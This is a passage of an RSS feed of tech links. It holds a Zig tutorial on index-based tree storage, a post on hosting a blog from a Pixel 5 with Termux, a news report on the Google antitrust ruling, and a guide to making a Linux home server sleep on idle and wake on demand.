An arraylist growing by moving elements to a bigger allocationInstant FreesFreeing structures which are allocated in the traditional “nest of pointers” fashion can be very slow, as the entire structure has to be traversed to find and individually free each node. Storing nodes in a single allocation eliminates this problem entirely and freeing the structure becomes just a single free call, as it should be.A Downside - Freeing Single NodesOne disadvantage of storing all the nodes in a contiguous buffer is that it makes it harder to free an individual node as removing a single element from an arraylist would involve shifting over all the elements after it, a linear time operation which is almost always too slow to be practical. In practice this isn’t something you normally need to do as many data structures, like an AST, can be freed all at once, but if you need to be able to free individual nodes and still want to use this technique then the obvious solution would be to use a freelist.FreelistsA freelist is, as the name suggests, a list used to track free slots in memory allocators. In our case we can simply use a stack to store indices of free slots in our arraylist and attempt to pop off this stack any time we add a new element. The extra code complexity should be weighed against the actual performance benefit when considering this approach.
A node allocation using a freelistCode ExampleHere is a short demo of this technique in Zig (v0.14.1). There are some Zig quirks involved like passing memory allocators and using an enum as an index type but hopefully the general idea is clear.pub fn main() !void {
    var debug_allocator = std.heap.DebugAllocator(.{}).init;
    defer _ = debug_allocator.deinit();

    var tree = Tree{
        // Zig uses a memory allocator interface to allow us to pass in an allocation strategy for the arraylist to use.
        .nodes = ArrayList(Tree.Node).init(debug_allocator.allocator()),
    };
    defer tree.nodes.deinit();

    // append the root node.
    const root = try tree.createNode(45);

    const a = try tree.createNode(-10);
    const b = try tree.createNode(89000);
    const c = try tree.createNode(2);

    tree.setLeftChild(root, a);
    tree.setRightChild(root, b);
    tree.setLeftChild(b, c);

    printTree(&tree);
}

const Tree = struct {
    /// Stores all the nodes in the tree. The root node is at index 0.
    nodes: ArrayList(Node),

    const Node = struct {
        data: i32,
        left_child: NodeIndex = .none,
        right_child: NodeIndex = .none,
    };

    // In Zig it is common to use a non-exhaustive enum instead of a bare integer for indices
    // to add back some of the type safety which is lost since we're not using pointers.
    const NodeIndex = enum(u32) {
        // The root nodes is stored at index 0, so 0 can be used as a null-value for child indices.
        none = 0,
        _,
    };

    fn createNode(tree: *Tree, value: i32) std.mem.Allocator.Error!NodeIndex {
        const index: NodeIndex = @enumFromInt(@as(u32, @intCast(tree.nodes.items.len)));
        try tree.nodes.append(.{ .data = value });
        return index;
    }

    fn setLeftChild(tree: *const Tree, parent: NodeIndex, child: NodeIndex) void {
        tree.nodes.items[@intFromEnum(parent)].left_child = child;
    }

    fn setRightChild(tree: *const Tree, parent: NodeIndex, child: NodeIndex) void {
        tree.nodes.items[@intFromEnum(parent)].right_child = child;
    }
};

fn printTree(tree: *const Tree) void {
    assert(tree.nodes.items.len > 0);

    // print the root node.
    printNode(tree, @enumFromInt(0), 0);
}

fn printNode(tree: *const Tree, node_index: Tree.NodeIndex, depth: u32) void {
    const node = tree.nodes.items[@intFromEnum(node_index)];

    for (0..depth) |_| print("  ", .{});
    print("[{d}] {d}\n", .{ @intFromEnum(node_index), node.data });

    if (node.left_child != .none) printNode(tree, node.left_child, depth + 1);
    if (node.right_child != .none) printNode(tree, node.right_child, depth + 1);
}

const std = @import("std");
const ArrayList = std.ArrayList;
const assert = std.debug.assert;
const print = std.debug.print;

And here is the output:$ zig run indices.zig
[0] 45
  [1] -10
  [2] 89000
    [3] 2



    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[This blog is running on a recycled Google Pixel 5 (2024)]]></title>
            <link>https://blog.ctms.me/posts/2024-08-29-running-this-blog-on-a-pixel-5/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45110209</guid>
            <description><![CDATA[An absolute mammoth post about how I am running this blog site from a Google Pixel 5 Android phone using only Termux. It includes what inspired me, what I'm using for the setup, and my longform notes on the entire project.]]></description>
            <content:encoded><![CDATA[
			If you glance over this blog, you will see that I am an avid Android fan. After setting up numerous Linux proot desktops on phones, I wanted to see if I use a phone as a server and run my blog from an Android phone. Since you are reading this, I was successful.
I was inspired my a few Mastodon posts earlier this week to give it a go. First, I stumbled on a post from @kaimac who is running a site from an ESP32 microcontroller. In the comments of that post, I saw a mention to compost.party created by user @computersandblues that runs completely on an Android device and a solar panel. Last, @stevelord who is essentially running a homelab on a TP-Link router with OpenWRT installed.
I think a lot about power consumption of my homelab and I also love using old hardware for random projects to give them new life. I was truly inspired by the above works, so I got right down to business.
The hardware
I looked through the devices I had laying around and I chose a Google Pixel 5 my brother-in-law gave me after he upgraded. The Pixel 5 is carrier locked to Verizon, which is notorious for making it impossible to also unlock the bootloader and install custom ROMs. At first I wanted a device that I could install PostmarketOS to run a proper Linux server. In the end, I’m glad I didn’t go that route.
Another reason I chose the Pixel 5 is because it supports USB-OTG and can use docks with hard-wired internet. I didn’t want to run the site on wifi and having an ethernet connection was mandatory.
Last, it is the most current phone I have. This device is open to the internet, so I wanted to make sure it is an updated as possible.
Solar powered blog!
This summer I’ve been testing using a 100w solar panel I got from Harbor Freight Tools so I can learn more about how it all works before diving into larger projects. I have that panel connected to a Jackery 160w power station to keep it charged up and we use it to charge our mobile devices. I got the Jackery last year as a power bank I use while on jobsites.
Since I already have this set up, I am now using it to power this blog. I’m happy with this setup as I’ve been getting more into permacomputing. Having a website that is fully offgrid using recycled parts is exciting!
What I used to create the site (Termux is the GOAT)
While considering what projects I could do with this phone, I was thinking I was going to install a proot desktop and then run from within a Linux environment. Before I started I decided to check out a few packages that are in Termux (the flat out amazing terminal emulator) to see how far I could push it.
I checked for some basics and read about setting up an ssh connection. Then I randomly searched for Hugo, which is what my blog was already built on. Sure enough, it is right there in the Termux repos! Turns out, it has been in there for a long time. I see a lot of posts from 2018 with people using it.
How has it been going
Great! Site is fast and reliable. I ran into a few hiccups on the first day or so, which were mostly around the version of Hugo on my server and the newer version I am using on the phone. The other is related to my solar setup and keeping an eye on the battery levels.
To be honest, I don’t think anyone can tell it is running on an Android phone instead of a x86 Linux box or a hyperscaler VPS.
At the moment I have no plans to change this setup and will leave it as-is until some issue arises. But, there’s really not much to report other than it works fantastic.
Below are my longform notes on how I set it up. But, the short version is it was way simpler than I thought it would be. You can get up and running with a Hugo site by just installing git, screen, your favorite text editor, and hugo straight from the repos.
Not included in this post is how I add new posts to the phone. I can use scp to send a files, but I prefer to use dufs that is a static file server in that can be accessed in the browser. Using dufs I can upload files and make quick edits straight in the browser from any device. Surprise! dufs is also in the Termux repos and is so easy to get up and running. Again, message me if you’d like to see a write-up about it.

Installs
Of course I need some basic utilities. These are the utilities I need to have at a minimum when working with a Linux system:

rsync
openssh
git
wget
curl
fish shell
cronie
termux-services
iperf3
speedtest-go
screen
helix
hugo

Restart Termux and use sv-enable to run certain items as services. I do this for sshd and cronie. It looks like this:
$ sv-enable sshd
$ sv-enable cronie
After running sv-enable, restart Termux.
openssh
I could build all of this straight from the phone using either the touchscreen keyboard or connecting a standard keyboard and mouse either with a USB-C dock or bluetooth. But, I want to manage this like all of my other servers, which is to ssh into the device and work from my desk.
There is an official guide for setting up an ssh server. All I will add here is some pointers I learned along the way.

Adding an ssh key is simple and should be one of the first steps done. After generating the key and importing with ssh-copy-id from the desktop, edit the sshd file in $PREFIX/etc/ssh/sshd_config.
Termux generates its own username and cannot be changed. Run whoami to see what it is.
It is the same for the ssh port. As far as I can tell you cannot change the port, which is automatically set to 8022.

Running the site
There are lots of guides out there on how to setup a hugo site. I have an existing site that I migrated from a VM to this phone, so my notes do not include how to get a hugo site running. I also do not need to do any port forwarding as I already have a reverse proxy that I just changed where it points for my blog.
I would like to hear feedback if there is a need to add those notes here. Message me on Mastodon or by email using the links at the bottom of this post.
Below are notes on how I use the package cronie to start the blog using screen and the automatically reload the blog occasionally. cronie is for setting up cron tasks. Once installed and enabled, run crontab -e like usual to setup tasks.
This is how I do it.
First, set a fish alias for the command to reload the blog:
alias blog_run='cd /data/data/com.termux/files/home/<website_root_dir> && /data/data/com.termux/files/usr/bin/hugo serve --bind=0.0.0.0 --baseURL=https://blog.ctms.me --appendPort=false --environment=production --disableFastRender --cacheDir /data/data/com.termux/files/home/<website_root_dir>/cache'

funcsave blog_run
Now, create a script and place in ~/scripts that closes a previous instance of screen, clears the cache, and then starts a new screen session titled “hugo” and execute the alias:
#! /bin/bash
screen -X -S "hugo" quit
rm -rf /data/data/com.termux/files/home/<website_root_dir/cache/<site_name_dir>/filecache/getresource/
screen -S hugo -d -m fish -c 'blog_run; exec fish'
Last, set it to run with cron
*/5 * * * * cd /data/data/com.termux/files/home/scripts && sh blog_reload.sh
Backing up
Since Termux supports ssh connections, I can use it on remote machines to pull the files from the phone using rsync.
First, need to install rsync on the phone with pkg install rsync.
Desktop backup
Now we can run it from my desktop to pull the files:
rsync -aP pixel:~/<website_root_dir> /local/dir/pixel_blog/
On my desktop, I have this for cron
@reboot sleep 30 && rsync -aP pixel:~/<website_root_dir> /local/dir/pixel_blog/ >> $HOME/logs/pixel-hugo-backup.log 2>&1
nas backup
This is the same configuration. The only difference is the backup location and the cron timing.
rsync -aP pixel:~/<website_root_dir> /local/dir/pixel_blog
The automation:
5 6 * * * rsync -aP pixel:~/<website_root_dir> /local/dir/pixel_blog >> $HOME/logs/pixel-hugo-backup.log 2>&1
git backup
I have a local self-hosted git instance I push backups to, but you can totally set it up to send them to Github or whatever forge you use. No instructions here because there are plenty of guides out there on how to set this up.

    
        - - - - -
    
    
        Thank you for reading! If you would like to comment on this post you can start a conversation on the Fediverse. Message me on Mastodon at @cinimodev@masto.ctms.me. Or, you may email me at blog.discourse904@8alias.com. This is an intentionally masked email address that will be forwarded to the correct inbox.
    



		]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Google can keep its Chrome browser but will be barred from exclusive contracts]]></title>
            <link>https://www.cnbc.com/2025/09/02/google-antitrust-search-ruling.html</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45108548</guid>
            <description><![CDATA[The ruling comes nearly a year after a U.S. judge ruled that Google holds an illegal monopoly in its core market of internet search.]]></description>
            <content:encoded><![CDATA[Google CEO Sundar Pichai during the press conference after his meeting with Polish PM Donald Tusk at Google for Startups Campus In Warsaw in Warsaw, Poland on February 13, 2025. Images)Jakub Porzycki | Nurphoto | Getty ImagesAlphabet shares popped 8% in extended trading as investors celebrated what they viewed as minimal consequences from a historic defeat last year in the landmark antitrust case.Last year, Google was found to hold an illegal monopoly in its core market of internet search.U.S. District Judge Amit Mehta ruled against the most severe consequences that were proposed by the Department of Justice, including the forced sale of Google's Chrome browser, which provides data that helps its advertising business deliver targeted ads. "Google will not be required to divest Chrome; nor will the court include a contingent divestiture of the Android operating system in the final judgment," the decision stated. "Plaintiffs overreached in seeking forced divestiture of these key assets, which Google did not use to effect any illegal restraints."Mehta, who oversaw the remedies trial in May, ordered the parties to meet by Sept. 10 for the final judgment.In August 2024, the U.S. District Court for the District of Columbia ruled that Google violated Section 2 of the Sherman Act and held a monopoly in search and related advertising.The antitrust trial started in September 2023."Now the Court has imposed limits on how we distribute Google services, and will require us to share Search data with rivals," Google said in a blog post. "We have concerns about how these requirements will impact our users and their privacy, and we're reviewing the decision closely. The Court did recognize that divesting Chrome and Android would have gone beyond the case's focus on search distribution, and would have harmed consumers and our partners."Read more CNBC tech newsKlarna aims to raise up to $1.27 billion in U.S. IPOTesla asks for $243 million verdict to be tossed in fatal Autopilot crash suitAlibaba is developing a new AI chip — here's what we know so farMeta changes teen AI chatbot responses as Senate begins probe into 'romantic' conversationsOne of the key areas of focus was the exclusive contracts Google held for distribution.In his decision Tuesday, Mehta said the company can make payments to preload products, but it cannot have exclusive contracts that condition payments or licensing.The DOJ had asked Google to stop the practice of "compelled syndication," which refers to the practice of making certain deals with companies to ensure its search engine remains the default choice in browsers and smartphones."The court's ruling today recognizes the need for remedies that will pry open the market for general search services, which has been frozen in place for over a decade," the DOJ said in a press release. "The ruling also recognizes the need to prevent Google from using the same anticompetitive tactics for its GenAI products as it used to monopolize the search market, and the remedies will reach GenAI technologies and companies."Google pays Apple billions of dollars per year to be the default search engine on iPhones. It's lucrative for Apple and a valuable way for Google to get more search volume and users.Apple stock rose 4% on Tuesday after hours."Google will not be barred from making payments or offering other consideration to distribution partners for preloading or placement of Google Search, Chrome, or its GenAI products. Cutting off payments from Google almost certainly will impose substantial—in some cases, crippling—downstream harms to distribution partners, related markets, and consumers, which counsels against a broad payment ban."Google was also ordered to loosen its hold on search data.During the remedies trial in May, the DOJ asked the judge to force Google to share the data it uses for generating search results, such as data about what users click on.Mehta ruled Tuesday that Google will have to make available certain search index data and user interaction data, though "not ads data."Google does not have to share or provide access to granular data with advertisers.The court narrowed the datasets Google will be required to share and said they must occur on "ordinary commercial terms that are consistent with Google's current syndication services."Stock Chart IconStock chart iconGoogle and Apple one-day stock chart.watch now]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Making a Linux home server sleep on idle and wake on demand (2023)]]></title>
            <link>https://dgross.ca/blog/linux-home-server-auto-sleep</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45108066</guid>
            <description><![CDATA[Daniel P. Gross is a computer software and hardware professional based in Toronto.]]></description>
            <content:encoded><![CDATA[
        
  

  
    2023-04-16
      in
        linux,
        backup,
        networking,
        wireshark,
        ruby,
        wake-on-lan,
        efficiency,
        homelab
  

  It began with what seemed like a final mundane touch to my home server setup for hosting Time Machine backups: I wanted it to automatically sleep when idle and wake up again when needed. You know, sleep on idle — hasn’t Windows had that built in since like Windows 98? How hard could it be to configure on a modern Ubuntu install?

To be fair, I wanted more than just sleep on idle, I also wanted wake on request — and that second bit turns out to be the hard part. There were a bunch of dead ends, but I stuck out it to find something that “just works” without the need to manually turn on the server for every backup. Join me on the full adventure further down, or cut to the chase with the setup instructions below.



tl;dr


  
  
  
  
    
  
  Home Server PC- High power consumption!- Ubuntu Linux- Mostly sleeps, wakes up on demandWake-on-LAN: unicast packetsRaspberry Pi (or similar)- Low power consumption- Ubuntu Linux- Always-onSSHAFP...Network servicesNetwork servicesARP Stand-inAvahi...Time machine backupsARP queries for HomeServermDNS queries for Home Server


Outcome:

  Server automatically suspends to RAM when idle
  Server automatically wakes when needed by anything else on the network, including SSH, Time Machine backups, etc.


You’ll need:

  An always-on Linux device on the same network as your server, e.g. a Raspberry Pi
  A network interface device for your server that supports wake-on-LAN with unicast packets


On the server:

  Enable wake-on-LAN with unicast packets (not just magic packets), make it persistent



sudo ethtool -s eno1 wol ug
sudo tee /etc/networkd-dispatcher/configuring.d/wol << EOF
#!/usr/bin/env bash

ethtool -s eno1 wol ug || true
EOF
sudo chmod 755 /etc/networkd-dispatcher/configuring.d/wol



  Set up a cron job to sleep on idle (replace /home/ubuntu with your desired script location)



tee /home/ubuntu/auto-sleep.sh << EOF
#!/bin/bash
logged_in_count=$(who | wc -l)
# We expect 2 lines of output from `lsof -i:548` at idle: one for output headers, another for the 
# server listening for connections. More than 2 lines indicates inbound connection(s).
afp_connection_count=$(lsof -i:548 | wc -l)
if [[ $logged_in_count < 1 && $afp_connection_count < 3 ]]; then
  systemctl suspend
else
  echo "Not suspending, logged in users: $logged_in_count, connection count: $afp_connection_count"
fi
EOF
chmod +x /home/ubuntu/auto-sleep.sh
sudo crontab -e
# In the editor, add the following line:
*/10 * * * * /home/ubuntu/auto-sleep.sh | logger -t autosuspend



  Disable IPv6: this approach relies on ARP, which IPv6 doesn’t use



sudo nano /etc/default/grub
# Find GRUB_CMDLINE_LINUX=""
# Change to GRUB_CMDLINE_LINUX="ipv6.disable=1"
sudo update-grub
sudo reboot



  Optional: Configure network services (e.g. Netatalk) to stop before sleep to prevent unwanted wakeups due to network activity



sudo tee /etc/systemd/system/netatalk-sleep.service << EOF
[Unit]
Description=Netatalk sleep hook
Before=sleep.target
StopWhenUnneeded=yes

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=-/usr/bin/systemctl stop netatalk
ExecStop=-/usr/bin/systemctl start netatalk

[Install]
WantedBy=sleep.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable netatalk-sleep.service


On the always-on device:

  Install ARP Stand-in: a super simple Ruby script that runs as a system service and responds to ARP requests on behalf of another machine. Configure it to respond on behalf of the sleeping server.
  Optional: Configure Avahi to advertise network services on behalf of the server when it’s sleeping.



sudo apt install avahi-daemon
sudo tee /etc/systemd/system/avahi-publish.service << EOF
[Unit]
Description=Publish custom Avahi records
After=network.target avahi-daemon.service
Requires=avahi-daemon.service

[Service]
ExecStart=/usr/bin/avahi-publish -s homeserver _afpovertcp._tcp 548 -H homeserver.local

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable avahi-publish.service --now
systemctl status avahi-publish.service


Caveats

  The server’s network device needs to support wake-on-LAN from unicast packets
  To prevent unwanted wake-ups, you’ll need to ensure no device on the network is sending extraneous packets to the server


How I got there
First, a bit about my hardware, as this solution is somewhat hardware-dependent:

  HP ProDesk 600 G3 SFF
  CPU: Intel Core i5-7500
  Network adapter: Intel I219-LM


Sleeping on idle
I started with sleep-on-idle, which boiled down to two questions:


  How to determine if the server is idle or busy at any given moment
  How to automatically suspend to RAM after being idle for some time


Most of the guides I found for sleep-on-idle, like this one, were for Ubuntu Desktop — sleep-on-idle doesn’t seem to be something that’s commonly done with Ubuntu Server. I came across a few tools that looked promising, the most notable being circadian. In general, though, there didn’t seem to be a standard/best-practice way to do it, so I decided I’d roll it myself the simplest way I could.

Determining idle/busy state
I asked myself what server activity would constitute being busy, and landed on two things:

  Logged in SSH sessions
  In-progress Time Machine backups


Choosing corresponding metrics was pretty straightforward:

  Count of logged in users, using who
  Count of connections on the AFP port (548), using lsof (I’m using AFP for Time Machine network shares)


For both metrics, I noted the values first at idle, and then again when the server was busy.

Automatically suspending to RAM
To keep things simple, I opted for a cron job that triggers a bash script — check out the final version shared above. So far it’s worked fine; if I ever need to account for more metrics in detecting idle state, I’ll consider using a more sophisticated option like circadian.

Waking on request
With sleep-on-idle out of the way, I moved on to figuring out how the server would wake on demand.

Could the machine be configured to automatically wake upon receiving a network request? I knew Wake-on-LAN supported waking a computer up using a specially crafted “magic packet”, and it was straightforward to get this working. The question was if a regular, non-“magic packet” could somehow do the same thing.

Wake on PHY?
Some online searching yielded a superuser discussion that looked particularly promising. It pointed to the man page for ethtool, the Linux utility used to configure network hardware. It shared ethtool’s complete wake-on-LAN configuration options:
wol p|u|m|b|a|g|s|f|d...
      Sets Wake-on-LAN options.  Not all devices support
      this.  The argument to this option is a string of
      characters specifying which options to enable.

      p   Wake on PHY activity
      u   Wake on unicast messages
      m   Wake on multicast messages
      b   Wake on broadcast messages
      a   Wake on ARP
      g   Wake on MagicPacket™
      s   Enable SecureOn™ password for MagicPacket™
      f   Wake on filter(s)
      d   Disable (wake on nothing).  This option
          clears all previous options.


It pointed in particular to the Wake on PHY activity option, which seemed perfect for this use-case. It seemed to mean that any packet sent to the network interface’s MAC address would wake it. I enabled the flag using ethtool, manually put the machine to sleep, then tried logging back in using SSH and sending pings. No dice: the machine remained asleep despite multiple attempts. So much for that 😕

Breakthrough: wake on unicast
None of ethtool’s other wake-on-LAN options seemed relevant, but some more searching pointed to the Wake on unicast messages as another option to try. I enabled the flag using ethtool, manually put the machine to sleep, then tried logging back in using SSH. Bingo! This time, the machine woke up. 🙌 With that, I figured I was done.

Not so fast — there were two problems:

  Sometimes, the server would wake up without any network activity that I knew of
  Some period of time after the server went to sleep, it would become impossible to wake it again using network activity other than a magic packet


A closer look at the same superuser discussion above revealed exactly the reason for the second problem: shortly after going to sleep, the machine was effectively disappearing from the network because it was no longer responding to ARP requests.

ARP
So the cached ARP entry for other machines on the network was expiring, meaning that they had no way to resolve the server’s IP address to its MAC address. In other words, an attempt to ping my server at 192.168.1.2 was failing to even send a packet to the server, because the server’s MAC address wasn’t known. Without a packet being sent, there was no way that server was going to wake up.

Static ARP?
My first reaction: let’s manually create ARP cache entries on each network client. This is indeed possible on macOS using:
sudo arp -s [IP address] [MAC address]


But it also didn’t meet the goal of having things “just work”: I was not interested in creating static ARP cache entries on each machine that would be accessing the server. On to other options.

ARP protocol offload?
Some more searching revealed something interesting: this problem had already been solved long ago in the Windows world.

It was called ARP protocol offload, and it goes like this:

  The network hardware is capable of responding to ARP requests independently of the CPU
  Before going to sleep, the OS configures the network hardware to respond to ARP requests
  While sleeping, the network hardware responds to ARP requests on its own, without waking the rest of the machine to use the CPU


Voila, this was exactly what I needed. I even looked at the datasheet for my network hardware, which lists ARP Offload as a feature on the front page.

The only problem? No Linux support. I searched the far reaches of the internet, then finally dug into the Linux driver source code to find that ARP offload isn’t supported by the Linux driver. This was when I briefly pondered trying to patch the driver to add ARP offload… before reminding myself that successfully patching Linux driver code is far beyond what I could hope to achieve in a little free-time project like this one. (Though maybe one day…)

Other solutions using magic packets
Some more searching led me to some other clever and elaborate solutions involving magic packets. The basic idea was to automate sending magic packets. One solution (wake-on-arp) listens for ARP requests to a specified host to trigger sending a magic packet to that host. Another solution implements a web interface and Home Assistant integration to enable triggering a magic packet from a smartphone web browser. These are impressive, but I wanted something simpler that didn’t require manually waking up the server.

I considered a few other options, but abandoned them because they felt too complex and prone to breaking:

  Writing a script to send a magic packet and then immediately trigger a Time Machine backup using tmutil. The script would need to be manually installed and scheduled to run periodically on each Mac.
  Using HAProxy to proxy all relevant network traffic through the Raspberry Pi and using a hook to send a magic packet to the server on activity.


Breakthrough: ARP Stand-in
What I was attempting didn’t seem much different from the static IP mapping that’s routinely configured on home routers, except that it was for DHCP instead of ARP. Was there no way to make my router do the same thing for ARP?

Some more digging into the ARP protocol revealed that ARP resolution doesn’t even require a specific, authoritative host to answer requests — any other network device can respond to ARP requests. In other words, my router didn’t need to be the one resolving ARP requests, it could be anything. Now how could I just set up something to respond on behalf of the sleeping server?

Here’s what I was trying to do:


  
  
  
    
  
  Home server PCMAC Address: AA:BB:CC:DD:EEIP Address:   192.168.1.3SSHAFP...Raspberry PiMAC Address: ZZ:YY:XX:WW:VVIP Address:   192.168.1.2ARP Stand-inAvahi...1Multicast ARP: What's 192.168.1.3'sMAC address?ARP: 192.168.1.3 is atAA:BB:CC:DD:EE Home server PCMAC Address: AA:BB:CC:DD:EEIP Address:   192.168.1.3SSHAFP...Raspberry PiMAC Address: ZZ:YY:XX:WW:VVIP Address:   192.168.1.2ARP Stand-inAvahi...2Unicast TCP packet to port 22 on AA:BB:CC:DD:EE Home server PCMAC Address: AA:BB:CC:DD:EEIP Address:   192.168.1.3SSHAFP...Raspberry PiMAC Address: ZZ:YY:XX:WW:VVIP Address:   192.168.1.2ARP Stand-inAvahi...3Communication continues normallyUnicast packet triggers wakeupStarts SSH sessionto home server123

I thought it must be possible to implement as a Linux network configuration, but the closest thing I found was Proxy ARP, which accomplished a different goal. So I went one level deeper, to network programming.

Now, how to go about listening for ARP request packets? This is apparently possible to do using a raw socket, but I also knew that tcpdump and Wireshark were capable of using filters to capture only packets of a given type. That led me to look into libpcap, the library that powers both of those tools. I learned that using libpcap had a clear advantage over a raw socket: libpcap implements very efficient filtering directly in the kernel, whereas a raw socket would require manual packet filtering in user space, which is less performant.

Aiming to keep things simple, I decided to try writing the solution in Ruby, which led me to the pcaprub Ruby bindings for libpcap. From there, I just needed to figure out what filter to use with libpcap. Some research and trial/error yielded this filter:

arp and arp[6:2] == 1 and arp[24:4] == [IP address converted to hex]


For example, using a target IP address of 192.168.1.2:

arp and arp[6:2] == 1 and arp[24:4] == 0xc0a80102


Let’s break this down, using the ARP packet structure definition for byte offets and lengths:

  arp — ARP packets
  arp[6:2] == 1 — ARP request packets. [6:2] means “the 2 bytes found at byte offset 6”.
  arp[24:4] == [IP address converted to hex] — ARP packets with the specified target address. [24:4] means “the 4 bytes found at byte offset 24”.


The rest is pretty straightforward and the whole solution comes out to only ~50 lines of Ruby code. In short, arp_standin is a daemon that does the following:


  Starts up, taking these configuration options:
    
      IP and MAC address of the machine it’s standing in for (the “target”)
      Network interface to operate on
    
  
  Listens for ARP requests for the target’s IP address
  On detecting an ARP request for the target’s IP address, responds with the target’s MAC address


Since the server’s IP → MAC address mapping is defined statically through the arp_standin daemon’s configuration, it doesn’t matter if the Raspberry Pi’s ARP cache entry for the server is expired.

Check out the link below to install it or explore the source code further:


  
  danielpgross/arp_standin on GitHub


ARP is used in IPv4 and is replaced by Neighbor Discovery Protocol (NDP) in IPv6. I don’t have any need for IPv6 right now, so I disabled IPv6 entirely on the server using the steps shown above. It should be possible to add support for Neighbor Discovery to the ARP-Standin service as a future enhancement.

With the new service running on my Raspberry Pi, I used Wireshark to confirm that ARP requests being sent to the server were triggering responses from the ARP Stand-in. It worked 🎉 — things were looking promising.

Getting it all working
The big pieces were in place:

  the server went to sleep after becoming idle
  the server could wake up from unicast packets
  other machines could resolve the server’s MAC address using ARP, long after it went to sleep


With the ARP Stand-in running, I turned on the server and ran a backup from my computer. When the backup was finished, the server went to sleep automatically. But there was a problem: the server was waking up immediately after going to sleep.

Unwanted wake-ups

First thing I checked was the Linux system logs, but these didn’t prove too helpful, since they didn’t show what network packet actually triggered the wakeup. Wireshark/tcpdump were no help here either, because they wouldn’t be running when the computer was sleeping. That’s when I thought to use port mirroring: capturing packets from an intermediary device between the server and the rest of the network. After a brief, unsuccessful attempt to repurpose an extra router running OpenWRT, a search for the least expensive network switch with port mirroring support yielded the TP-Link TL-SG105E for ~$30.


  
  TL-SG105E: a simple, inexpensive switch with port-mirroring support


With the switch connected and port mirroring enabled, I started capturing with Wireshark and the culprits immediately became clear:


  My Mac, which was configured to use the server as a Time Machine backup host using AFP, was sending AFP packets to the server after it had gone to sleep
  My Netgear R7000, acting as a wireless access point, was sending frequent, unsolicited NetBIOS NBTSTAT queries to the server


Eliminating AFP packets
I had a hunch about why the Mac was sending these packets:

  The Mac mounted the AFP share to perform a Time Machine backup
  The Time Machine backup finished, but the share remained mounted
  The Mac was checking on the status of the share periodically, as would be done normally for a mounted network share


I also had a corresponding hunch that the solution would be to make sure the share got unmounted before the server went to sleep, so that the Mac would no longer ping the server for its status afterwards. I figured that shutting down the AFP service would trigger unmounting of shares on all its clients, achieving the goal. Now I just needed to ensure the service would shut down when the server was going to sleep, then start again when it woke back up.

Fortunately, systemd supports exactly that, and relatively easily — I defined a dedicated systemd service to hook into sleep/wake events (check out the configuration shared above). A Wireshark capture confirmed that it did the trick.

Eliminating NetBIOS packets
This one proved to be harder, because the packets were unsolicited — they seemed random and unrelated to any activity being done by the server. I thought they might be related to Samba services running on the server, but the packets persisted even after I completely removed Samba from the server.

Why was my network router sending NetBIOS requests, anyway? Turns out that Netgear routers have a feature called ReadySHARE for sharing USB devices over the network using the SMB protocol. Presumably, the router firmware uses Samba behind the scenes, which uses NetBIOS queries to build and maintain its own representation of NetBIOS hosts on the network. Easy — turn off ReadySHARE, right? Nope, there’s no way to do that in Netgear’s stock firmware 😒.

That led me to take the plunge and flash the router with open-source FreshTomato firmware. I’m glad I did, because the firmware is much better than the stock one anyway, and it immediately stopped the unwanted NetBIOS packets.

Time Machine not triggering wake-up
I was getting close now: the server remained asleep, and I could reliably wake it up by logging in with SSH, even long after it went to sleep.

This was great, but one thing wasn’t working: when starting a backup on my Mac, Time Machine would show a loading state indefinitely with Connecting to backup disk... and eventually give up. Was the server failing to wake up from packets the Mac was sending, or was the Mac not sending packets at all?


  


A port-mirrored Wireshark capture answered that question: the Mac wasn’t sending any packets to the server, even long after it started to say Connecting to backup disk.... Digging into the macOS Time Machine logs with:

log show --style syslog --predicate 'senderImagePath contains[cd] "TimeMachine"' --info


A few entries made it clear:
(TimeMachine) [com.apple.TimeMachine:Mounting] Attempting to mount 'afp://backup_mbp@homeserver._afpovertcp._tcp.local./tm_mbp'
...
(TimeMachine) [com.apple.TimeMachine:General] Failed to resolve CFNetServiceRef with name = homeserver type = _afpovertcp._tcp. domain = local.


The Mac was using mDNS (a.k.a. Bonjour, Zeroconf) to resolve the backup server’s IP address using its hostname. The server was asleep and therefore not responding to the requests, so the Mac was failing to resolve its IP address. This explained why the Mac wasn’t sending any packets to the server, leaving it asleep.

mDNS stand-in
I already had an ARP stand-in service, now I needed my Raspberry Pi to also respond to mDNS queries for the server while it slept. I knew that Avahi was one of the main mDNS implementations for Linux. I first tried these instructions using .service files to configure my Raspberry Pi to respond to mDNS queries on behalf of the server. I used the following on the Mac to check the result:
dns-sd -L homeserver _afpovertcp._tcp local


For some reason, that approach just didn’t work; Avahi didn’t respond on behalf of the server. I experimented instead with avahi-publish (man page), which (to my pleasant surprise) worked right away using the following:
avahi-publish -s homeserver _afpovertcp._tcp 548 -H homeserver.local


With that, I just needed to create a systemd service definition that would automatically run the avahi-publish command on boot (check out the configuration shared above).

🏁 Finish
With all the wrinkles ironed out, everything has been working well now for over a month. I hope you’ve enjoyed following along and that this approach works for you too.

This post was discussed on Hacker News and Reddit.



      ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[A staff engineer's journey with Claude Code]]></title>
            <link>https://www.sanity.io/blog/first-attempt-will-be-95-garbage</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45107962</guid>
            <description><![CDATA[This started as an internal Sanity workshop where I demoed how I actually use AI. Spoiler: it's running multiple agents like a small team with daily amnesia.]]></description>
            <content:encoded><![CDATA[First attempt will be 95% garbage: A staff engineer's 6-week journey with Claude Code | Sanity]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Vijaye Raji to become CTO of Applications with acquisition of Statsig]]></title>
            <link>https://openai.com/index/vijaye-raji-to-become-cto-of-applications-with-acquisition-of-statsig/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45106981</guid>
        </item>
        <item>
            <title><![CDATA[Physically based rendering from first principles]]></title>
            <link>https://imadr.me/pbr/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45106846</guid>
